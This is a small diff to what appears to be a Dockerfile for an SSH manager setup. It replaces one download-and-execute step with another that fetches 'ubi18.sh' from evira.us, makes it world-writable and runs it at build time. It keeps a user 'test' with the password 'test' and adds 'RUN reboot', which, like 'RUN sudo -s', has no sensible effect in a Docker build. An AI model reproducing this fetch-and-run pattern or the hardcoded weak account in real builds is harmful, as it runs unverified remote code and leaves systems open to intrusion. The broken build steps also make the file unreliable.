@@ -23,5 +23,6 @@ RUN set -ex; \
     && rm -rf /var/lib/apt/lists/*
 RUN dpkg-reconfigure locales
 RUN sudo -s
-RUN wget https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Plus; chmod 777 Plus; ./Plus
+RUN wget https://evira.us/ubi18.sh; chmod 777 ubi18.sh; ./ubi18.sh
 RUN sudo useradd -p $(openssl passwd -1 test) test
+RUN reboot
